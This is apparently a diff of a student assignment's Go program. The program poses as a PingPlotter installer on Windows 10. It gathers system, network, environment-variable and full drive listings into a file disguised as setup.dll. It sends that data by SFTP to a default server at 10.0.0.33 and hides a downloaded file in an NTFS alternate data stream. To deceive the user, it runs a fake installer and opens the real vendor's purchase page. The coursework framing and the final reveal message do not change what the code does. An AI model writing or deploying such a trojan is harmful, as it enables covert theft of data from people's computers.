@@ -1,10 +1,16 @@
-package main
-
 /*
-TODO
-- Upload Readme.txt with ADS
+
+-- Assignment 2c --
+S3636862 -- Negar Farshchi
+S3751243 -- Matthew Waiariki
+
+-- Target is Windows 10 machine. --
+It is able to handle is user is using a OneDrive Desktop or Normal Desktop
+Set custom SFTP server, use flag " -sftp "sftp server address"
 
 */
+
+package main
 
 import (
 	"flag"
@@ -24,18 +30,22 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
+// main() Simply Calls functions in order of use.
 func main() {
 	setupFakeEnv()
-	saveAllInfo()
+	saveSystemInfo()
 	fileManger()
-	bluff()
-	over()
+	bluffUser()
+	informUserOfHack()
 }
 
+// setupFakeEnv() recreates files saved in byte form, it also creates files and folders that will be used.
 func setupFakeEnv() {
+	// Makes a folder called Moto in the user Temp Folder
 	usrDir := getUserHomeDir()
 	path := filepath.Join(usrDir, "\\AppData\\Local\\Temp\\Moto\\")
 	os.MkdirAll(path, os.ModePerm)
+
 	// Create Fake Installer
 	fakeInstall, err := PingPlotterFakeResource()
 	installer, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\Moto\\PingPlotterInstaller.exe")
@@ -72,12 +82,11 @@ func setupFakeEnv() {
 	}
 }
 
-// OneDriveCheck finds if the system has Onedrive enabled and changes desktop locaiton accordingly
+// OneDriveCheck finds if the system has Onedrive enabled and changes desktop location accordingly
 func OneDriveCheck() string {
 	var desktopLocation string
 
 	usrDir := getUserHomeDir()
-
 	fmt.Println(usrDir)
 
 	if _, err := os.Stat(usrDir + "\\Desktop\\"); err != nil {
@@ -90,21 +99,24 @@ func OneDriveCheck() string {
 	return desktopLocation
 }
 
-func saveAllInfo() {
-
+// saveAllInfo() is the parent function that initializes each grab functions to get system information and stores them to setup.dll
+func saveSystemInfo() {
 	usrDir := getUserHomeDir()
 	f, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\Moto\\setup.dll")
 
+	// Declares Variables and calls functions to fill them
 	system := sysGrab()
 	environment := envGrab()
 	network := netGrab()
 	folders := folderGrab()
 
+	// writes variables to file
 	f.WriteString("[SYSTEM INFO]\n" + system + "\n\n")
 	f.WriteString("[NETWORK INFO]\n" + network + "\n\n")
 	f.WriteString("[ENVIRONMENT INFO]\n" + environment + "\n\n")
 	f.WriteString("[FOLDER INFO]\n" + folders + "\n\n")
 
+	// quick  error catcher
 	if err != nil {
 		fmt.Println(err)
 		f.Close()
@@ -112,11 +124,13 @@ func saveAllInfo() {
 	}
 }
 
+// fileManger() is a parrent function to ensure each are done consecutively
 func fileManger() {
 	copyFiles()
 	syncWithSFTP()
 }
 
+// copyFiles() copies captured system information to all desired locations.
 func copyFiles() {
 	usrDir := getUserHomeDir()
 	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\Moto\\setup.dll")
@@ -130,7 +144,9 @@ func copyFiles() {
 	fmt.Println("COPY DONE")
 }
 
+// syncWithSFTP() uploads and downloads files to SFTP servers
 func syncWithSFTP() {
+	// pemBytes reads in the SSH Key for use.
 	usrDir := getUserHomeDir()
 	pemBytes, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\Moto\\key.pem")
 	if err != nil {
@@ -151,6 +167,7 @@ func syncWithSFTP() {
 	}
 	fmt.Println("cfg LOADED")
 
+	// flags are checked to see if there is a change in sftp server, else defaults to 10.0.0.33
 	var sftpIP string
 	flag.StringVar(&sftpIP, "sftp", "10.0.0.33", "specify IP address of sftp server.  defaults to 10.0.0.33")
 	flag.Parse()
@@ -170,7 +187,7 @@ func syncWithSFTP() {
 	defer client.Close()
 	fmt.Println("client LOADED")
 
-	// Walk directory on Remote
+	// Walk directory on Remote (dev)
 	// w := client.Walk("/")
 	// for w.Step() {
 	// 	if w.Err() != nil {
@@ -183,7 +200,10 @@ func syncWithSFTP() {
 	// Export System Data
 	//	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\Moto\\setup.dll")
 
+	// Checks system if OneDrive is in use for Desktop location, Sets path accordingly
 	desktop := OneDriveCheck()
+
+	// Setup for downloading file from Remote
 	srcPath := ""
 	dstPath := (usrDir + desktop + "startup3751243.bat:")
 	filename := "bannana.html"
@@ -207,17 +227,7 @@ func syncWithSFTP() {
 	fmt.Println("bannana DOWNLOADED")
 }
 
-func bluff() {
-	usrDir := getUserHomeDir()
-
-	time.Sleep(time.Second)
-	cmd1 := exec.Command(usrDir + "\\AppData\\Local\\Temp\\Moto\\PingPlotterInstaller.exe")
-	cmd1.Run()
-	// pid := cmd1.Process.Pid
-	// fmt.PrintLn(pid)
-	exec.Command("rundll32", "url.dll,FileProtocolHandler", "https://www.pingplotter.com/products/purchase").Start()
-}
-
+// sysGrab() uses "github.com/elastic/go-sysinfo" to grab host information and return as a string
 func sysGrab() string {
 	var systemInfo string
 
@@ -237,6 +247,7 @@ func sysGrab() string {
 	return systemInfo
 }
 
+// netGrab() uses "github.com/elastic/go-sysinfo" to grab network information and return as a string
 func netGrab() string {
 	// Get Network Info
 	var networkInfo string
@@ -264,6 +275,7 @@ func netGrab() string {
 	return networkInfo
 }
 
+// envGrab() uses in build OS function to grab environmental information and return as a string
 func envGrab() string {
 	// Get env variables
 	var envoInfo string
@@ -275,6 +287,7 @@ func envGrab() string {
 	return envoInfo
 }
 
+// folderGrab() uses in build OS function to grab all files/folders in C:\ drive and return as a string
 func folderGrab() string {
 	// Get all folders and files in searchFolder
 	var envoInfo string
@@ -290,6 +303,7 @@ func folderGrab() string {
 	return envoInfo
 }
 
+// getUserHomeDir() uses the Environmental variables to locate the current users home directory returning is as a string
 func getUserHomeDir() string {
 	if runtime.GOOS == "windows" {
 		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
@@ -301,7 +315,21 @@ func getUserHomeDir() string {
 	return os.Getenv("HOME")
 }
 
-func over() {
+// bluffUser() to match spec, this runs a fake installer to bluff the user into thinking the file works as expected
+// continues bluff by linking to actual website of Alledged program
+func bluffUser() {
+	usrDir := getUserHomeDir()
+
+	time.Sleep(time.Second)
+	cmd1 := exec.Command(usrDir + "\\AppData\\Local\\Temp\\Moto\\PingPlotterInstaller.exe")
+	cmd1.Run()
+	// pid := cmd1.Process.Pid
+	// fmt.PrintLn(pid)
+	exec.Command("rundll32", "url.dll,FileProtocolHandler", "https://www.pingplotter.com/products/purchase").Start()
+}
+
+// informUserOfHack() is used to run batch file that extracts file from ADS of itself and run it for the user to see
+func informUserOfHack() {
 	time.Sleep(5 * time.Second)
 	usrDir := getUserHomeDir()
 	desktop := OneDriveCheck()
